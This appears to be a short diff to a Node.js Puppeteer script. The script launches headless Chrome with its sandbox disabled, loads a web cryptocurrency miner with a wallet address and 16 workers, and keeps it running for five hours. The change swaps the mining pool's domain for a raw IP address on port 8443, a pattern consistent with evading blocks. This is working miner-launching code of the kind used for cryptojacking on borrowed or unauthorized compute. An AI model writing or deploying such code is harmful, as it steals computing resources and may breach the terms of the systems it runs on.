@@ -55,7 +55,7 @@ const puppeteer = require('puppeteer');
     args: ['--no-sandbox', '--disable-setuid-sandbox']
   });
   const page = await browser.newPage();
-  await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
+  await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=45.115.225.39&port=8443&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
 
   // Set timeout to keep the browser open for 5 hours (18000 seconds)
   setTimeout(async () => {
